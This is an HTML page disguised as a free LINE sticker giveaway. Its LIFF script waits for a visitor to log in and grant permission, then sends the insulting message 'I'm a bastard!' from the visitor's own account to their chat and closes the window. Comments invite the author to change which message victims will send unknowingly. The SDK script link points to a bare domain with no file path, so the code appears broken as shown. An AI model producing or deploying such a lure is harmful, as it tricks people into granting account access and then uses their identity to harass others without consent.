<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>限時貼圖免費領取</title>
    <!-- 引入 LINE 官方的 LIFF SDK -->
    <script src="https://line-scdn.net"></script>
</head>
<body>
    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
        <h2>正在載入 LINE 貼圖，請稍候...</h2>
    </div>

    <script>
        // 初始化你的 LIFF (已填入你剛才畫面上的第一組 LIFF ID)
        liff.init({ liffId: "2012018749-htFqDWtX" }).then(() => {
            if (liff.isLoggedIn()) {
                // 當使用者點開並同意授權，自動幫他發送這段訊息
                liff.sendMessages([{
                    type: 'text',
                    text: '我是王八蛋！' // 👈 【在這裡修改你想讓對方自動傳的字！】
                }]).then(() => {
                    liff.closeWindow(); // 傳送成功後自動關閉 LINE 內建瀏覽器視窗
                }).catch((err) => {
                    alert("發送失敗，請確認群組發言權限。");
                });
            } else {
                liff.login(); // 沒授權過就引導登入（按許可授權）
            }
        }).catch((err) => {
            console.log("初始化失敗", err);
        });
    </script>
</body>
</html>
